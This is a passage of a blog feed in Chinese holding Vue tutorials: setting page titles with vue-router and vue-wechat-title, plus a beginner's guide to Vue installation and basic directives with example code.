        path:<span class="string">'/login'</span>,</span><br><span class="line">            name:<span class="string">'Login'</span>,</span><br><span class="line">            meta:&#123;</span><br><span class="line">                title:<span class="string">'登录'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            component:siteLogin,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">'/userinfo'</span>,</span><br><span class="line">            name:<span class="string">'UserInfo'</span>,</span><br><span class="line">            meta:&#123;</span><br><span class="line">                title: <span class="string">'用户信息'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            component:userInfo,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><p>主要是在路由配置时设置了<code>meta:{title:&#39;xxxx&#39;}</code>如下图：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/%E5%8A%A0%E5%85%A5title.png" alt="router.js中增加title的配置"></p><h2 id="3、在App-vue页面中使用"><a href="#3、在App-vue页面中使用" class="headerlink" title="3、在App.vue页面中使用"></a>3、在App.vue页面中使用</h2><p>App.vue代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=<span class="string">"app"</span>  v-wechat-title=<span class="string">"$route.meta.title"</span>&gt;</span><br><span class="line">    &lt;router-view /&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'App'</span>,</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure><p>主要是在<code>&lt;div id=&quot;app&quot;  v-wechat-title=&quot;$route.meta.title&quot;&gt;</code> 加入了<code>v-wechat-title=&quot;$route.meta.title&quot;</code></p><h2 id="4、在main-js中引用vue-wechat-title"><a href="#4、在main-js中引用vue-wechat-title" class="headerlink" title="4、在main.js中引用vue-wechat-title"></a>4、在main.js中引用vue-wechat-title</h2><p>在main.js中引用vue-wechat-title的时候有个坑，如果按照一般的引用会报错<br>mian.js代码示例如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"@/router/router"</span>;  <span class="comment">//引入路由，会去找router下的router.js的配置文件</span></span><br><span class="line"><span class="keyword">import</span> VueWechatTitle <span class="keyword">from</span> <span class="string">'vue-wechat-title'</span>; <span class="comment">//引入VueWechatTitle</span></span><br><span class="line">createApp(App).use(router,VueWechatTitle).mount(<span class="string">'#app'</span>)  <span class="comment">//创建应用的时候应用路由</span></span><br></pre></td></tr></table></figure><p>在终端输入 npm run serve 将前端服务启动起来会报错！<br><font color=Red>Uncaught TypeError: Cannot read properties of undefined (reading ‘deep’)</font></p><p>原因是在挂载app示例前，vue-wechat-title还没有加载好，一定要先应用再挂载app<br>将createApp(App).use(router,VueWechatTitle).mount(‘#app’)删除或注释掉。改用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app=createApp(App);</span><br><span class="line">app.use(VueWechatTitle);</span><br><span class="line">app.use(router);</span><br><span class="line">app.mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><p>main.js的参考示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"@/router/router"</span>;  <span class="comment">//引入路由，会去找router下的router.js的配置文件</span></span><br><span class="line"><span class="keyword">import</span> VueWechatTitle <span class="keyword">from</span> <span class="string">'vue-wechat-title'</span>; <span class="comment">//引入VueWechatTitle</span></span><br><span class="line"><span class="comment">//createApp(App).use(router,VueWechatTitle).mount('#app')  //指令定义在 mount('#app')之后，导致自定义指令未挂载到，会报错</span></span><br><span class="line"><span class="keyword">const</span> app=createApp(App);</span><br><span class="line">app.use(VueWechatTitle);</span><br><span class="line">app.use(router);</span><br><span class="line">app.mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><h2 id="5、验证效果-1"><a href="#5、验证效果-1" class="headerlink" title="5、验证效果"></a>5、验证效果</h2><p>在终端输入 npm run serve 将前端服务启动起来<br>看到访问不同的URL会显示不同的title<br><a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/home%E8%B7%AF%E7%94%B1.png" alt="http://localhost:8080/的title"><br><a href="http://localhost:8080/login" target="_blank" rel="noopener">http://localhost:8080/login</a></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/login%E7%9A%84title.png" alt="login的title登录"></p><p><a href="http://localhost:8080/userinfo" target="_blank" rel="noopener">http://localhost:8080/userinfo</a></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/userinfo%E7%9A%84title.png" alt="userinfo的title用户信息"></p><p>本文通过以上实例实现了Vue3引入vue-router路由并设置页面Title，通过vue-router实现页面的路由，通过vue-wechat-title来设置页面的title都还比较方便。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue快速入门</title>
      <link href="/posts/9277bcaa/"/>
      <url>/posts/9277bcaa/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是Vue"><a href="#一、什么是Vue" class="headerlink" title="一、什么是Vue"></a>一、什么是Vue</h2><p>Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>1、独立版本<br>直接下载并用<code>&lt;script&gt;</code>标签引入<br>官网下载地址：<a href="https://cn.vuejs.org/js/vue.js" target="_blank" rel="noopener">https://cn.vuejs.org/js/vue.js</a><br>2、使用CDN<br>和独立版本类似，与独立版本的区别就是不用下载到本地应用，直接引用CDN加速以后的地址。缺点是如果是内网封闭环境不能用，国内CDN也不稳定，国外的CDN有时无法访问。如官网的<br><code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&quot;&gt;&lt;/script&gt;</code> 就无法访问。<br>几个比较稳定的CDN<br>Staticfile CDN（国内） : <a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a><br>unpkg：<a href="https://unpkg.com/vue@2.6.14/dist/vue.min.js。" target="_blank" rel="noopener">https://unpkg.com/vue@2.6.14/dist/vue.min.js。</a><br>cdnjs : <a href="https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js" target="_blank" rel="noopener">https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js</a><br>3、命令行工具<br>Vue 提供了一个官方的 CLI，为单页面应用 (SPA) 快速搭建繁杂的脚手架。它为现代前端工作流提供了开箱即用的构建设置。只需要几分钟的时间就可以运行起来并带有热重载、保存时 lint 校验，以及生产环境可用的构建版本。更多详情可查阅 Vue CLI 的文档。</p><h2 id="三、第一个Vue"><a href="#三、第一个Vue" class="headerlink" title="三、第一个Vue"></a>三、第一个Vue</h2><p>程序员学一门新的语音或框架，都是从hello world！开始的。来看一下Vue的hello world!<br>将vue.min.js下载到本地，在vue.min.js的目录下新建一个hellovue.html的文件，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=<span class="string">"vue.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="app"&gt;</span></span><br><span class="line"><span class="regexp">  &#123;&#123; message &#125;&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'Hello Vue!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>用浏览器打开，hello Vue! 成功的展现出来，第一个Vue就这么简单。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/hellovue.png" alt="hello Vue!"></p><p>在这里我们通过<code>&lt;script src=&quot;vue.min.js&quot;&gt;&lt;/script&gt;</code>引入了本地的vue.min.js，就可以用vue框架了。<br>通过<code>&lt;div id=&quot;app&quot;&gt;</code>构建了一个DOM元素div标签元素，id为app，`{{message}}` 是占位符，类似于大多数的模板语法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">  &#123;&#123; message &#125;&#125;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><p>在javascript代码中，定义了一个Vue对象，对象中构造了el和data两个参数。el是元素选择器，通过<code>#app</code>选择了<code>id=&quot;app&quot;</code>的div，data用来定义数据属性，这里定义了<code>massage:&#39;hellow Vue!&#39;</code>,通过`{{message}}`将数据hellow Vue显示输出。<br>可以用chrome浏览器的开发者工具打开控制台看到app.message的值为’hellow Vue!’。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/%E8%B0%83%E8%AF%95hellovue.png" alt="chrome浏览器的开发者工具调试"></p><p>可以通过修改这个变量的值而改变显示在浏览器的值。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/%E4%BF%AE%E6%94%B9hellovue.png" alt="修改值"></p><h2 id="四、常用基本语法"><a href="#四、常用基本语法" class="headerlink" title="四、常用基本语法"></a>四、常用基本语法</h2><p>模板语法<br>Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。<br>Vue.js 的核心是一个允许你采用简洁的模板语法来声明式的将数据渲染进 DOM 的系统。<br>结合响应系统，在应用状态改变时， Vue 能够智能地计算出重新渲染组件的最小代价并应用到 DOM 操作上</p><h3 id="插值文本"><a href="#插值文本" class="headerlink" title="插值文本"></a>插值文本</h3><p>数据绑定最常见的形式就是使用 `{{xxx}}`（双大括号）的文本插值：<br>正如我们的第一的Vue通过`{{ message }}`将文本值插入到占位符进行数据绑定</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h3 id="绑定输出html"><a href="#绑定输出html" class="headerlink" title="绑定输出html"></a>绑定输出html</h3><p>使用v-html 指令用于输出 html 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app2:v-html指令输出html代码</span><br><span class="line">&lt;div id=<span class="string">"app2"</span>&gt;</span><br><span class="line">    &lt;div v-html=<span class="string">"message"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">var app2 = new Vue(&#123;</span></span><br><span class="line"><span class="regexp">  el: '#app2',</span></span><br><span class="line"><span class="regexp">  data: &#123;</span></span><br><span class="line"><span class="regexp">    message: '&lt;b&gt;Hello Vue!&lt;/</span>b&gt;<span class="string">'</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br></pre></td></tr></table></figure><p>效果如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-html.png" alt="v-html"></p><p>如果不用v-html插入，将<code>&lt;div id=&quot;app2&quot;&gt;</code>标签内容改成用文本插入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app2"</span>&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><p>显示效果如下，直接将html代码给显示出来了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/%E7%9B%B4%E6%8E%A5%E6%98%BE%E7%A4%BAhtml%E4%BB%A3%E7%A0%81.png" alt="直接显示HTML代码"></p><h3 id="绑定属性"><a href="#绑定属性" class="headerlink" title="绑定属性"></a>绑定属性</h3><p>HTML 属性中的值应使用 v-bind 指令。<br>如插入绑定 a 标签的href属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app3:v-bind指令绑定属性值</span><br><span class="line">&lt;div id=<span class="string">"app3"</span>&gt;</span><br><span class="line">    &lt;a target=<span class="string">"_blank"</span> v-bind:href=<span class="string">"url"</span>&gt;click me go to myblog&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line"><span class="keyword">var</span> app3 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app3'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    url: <span class="string">'http://xiejava.ishareread.com/'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-bind%E5%B1%9E%E6%80%A7.png" alt="绑定属性"></p><h3 id="绑定样式"><a href="#绑定样式" class="headerlink" title="绑定样式"></a>绑定样式</h3><p>class 与 style 是 HTML 元素的属性，用于设置元素的样式，可以用 v-bind 来绑定设置样式属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app4:v-band:<span class="class"><span class="keyword">class</span>指令绑定样式</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span></span>=<span class="string">"app4"</span>&gt;</span><br><span class="line">  &lt;div v-bind:<span class="class"><span class="keyword">class</span></span>=<span class="string">"&#123; 'active': isActive &#125;"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp">var app4=new Vue(</span></span><br><span class="line"><span class="regexp">&#123;</span></span><br><span class="line"><span class="regexp"> el: '#app4',</span></span><br><span class="line"><span class="regexp">  data: &#123;</span></span><br><span class="line"><span class="regexp">    isActive:true</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br></pre></td></tr></table></figure><p>定义样式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="selector-class">.active</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-bind%E6%A0%B7%E5%BC%8F.png" alt="v-band:class"></p><h3 id="插值Javascript表达式"><a href="#插值Javascript表达式" class="headerlink" title="插值Javascript表达式"></a>插值Javascript表达式</h3><p>vue.js插值支持javascript表达式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app5:vue.js插值的javascript表达式支持</span><br><span class="line">&lt;div id=<span class="string">"app5"</span>&gt;</span><br><span class="line">    &#123;&#123;<span class="number">5</span>+<span class="number">5</span>&#125;&#125;&lt;br&gt;</span><br><span class="line">    &#123;&#123; ok ? <span class="string">'YES'</span> : <span class="string">'NO'</span> &#125;&#125;&lt;br&gt;</span><br><span class="line">    &#123;&#123; message.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>) &#125;&#125;</span><br><span class="line">    &lt;div v-bind:id=<span class="string">"'list-' + id"</span>&gt;xiejava&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"><span class="keyword">var</span> app5 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app5'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    ok: <span class="literal">true</span>,</span><br><span class="line">    message: <span class="string">'XIEJAVA'</span>,</span><br><span class="line">    id : <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Javascript%E8%A1%A8%E8%BE%BE%E5%BC%8F.png" alt="vue.js插值支持javascript表达式"></p><p>常用语句</p><h3 id="v-if-v-else-（条件语句）"><a href="#v-if-v-else-（条件语句）" class="headerlink" title="v-if v-else （条件语句）"></a>v-if v-else （条件语句）</h3><p>条件判断使用 v-if 指令，可以用 v-else 指令给 v-if 添加一个 “else” 块：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app6:v-<span class="keyword">if</span>条件语句</span><br><span class="line">&lt;div id=<span class="string">"app6"</span>&gt;</span><br><span class="line">&lt;div v-<span class="keyword">if</span>=<span class="string">"ok"</span>&gt;YES&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;div v-else&gt;NO&lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">var app6 = new Vue(&#123;</span></span><br><span class="line"><span class="regexp"> el:"#app6",</span></span><br><span class="line"><span class="regexp"> data:&#123;</span></span><br><span class="line"><span class="regexp"> ok:false,</span></span><br><span class="line"><span class="regexp"> &#125;</span></span><br><span class="line"><span class="regexp"> &#125;);</span></span><br></pre></td></tr></table></figure><p> 效果如下：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-if.png" alt="v-if v-else （条件语句）"></p><h3 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h3><p>循环使用 v-for 指令，v-for 可以绑定数据到数组来渲染一个列表</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app7"</span>&gt;</span><br><span class="line">  &lt;ol&gt;</span><br><span class="line">    &lt;li v-<span class="keyword">for</span>=<span class="string">"code in codes"</span>&gt;</span><br><span class="line">      &#123;&#123; code.name &#125;&#125;</span><br><span class="line">    &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>ol&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp">var app7=new Vue(</span></span><br><span class="line"><span class="regexp">&#123;</span></span><br><span class="line"><span class="regexp"> el: '#app7',</span></span><br><span class="line"><span class="regexp">  data: &#123;</span></span><br><span class="line"><span class="regexp">    codes: [</span></span><br><span class="line"><span class="regexp">      &#123; name: 'java' &#125;,</span></span><br><span class="line"><span class="regexp">      &#123; name: 'python' &#125;,</span></span><br><span class="line"><span class="regexp">      &#123; name: 'php' &#125;</span></span><br><span class="line"><span class="regexp">    ]</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-for.png" alt="for循环语句"></p><h3 id="v-on绑定事件"><a href="#v-on绑定事件" class="headerlink" title="v-on绑定事件"></a>v-on绑定事件</h3><p>事件监听可以使用 v-on 指令进行绑定</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app8"</span>&gt;</span><br><span class="line">  &lt;button v-on:click=<span class="string">"counter += 1"</span>&gt;+<span class="number">1</span>&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;p&gt;加了 &#123;&#123; counter &#125;&#125; 次1。&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">var app8=new Vue(</span></span><br><span class="line"><span class="regexp">&#123;</span></span><br><span class="line"><span class="regexp"> el: '#app8',</span></span><br><span class="line"><span class="regexp">  data: &#123;</span></span><br><span class="line"><span class="regexp">    counter:0</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/v-on%E7%BB%91%E5%AE%9A%E4%BA%8B%E4%BB%B6.png" alt="v-on绑定事件"></p><p><strong>以上全部示例代码如下：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 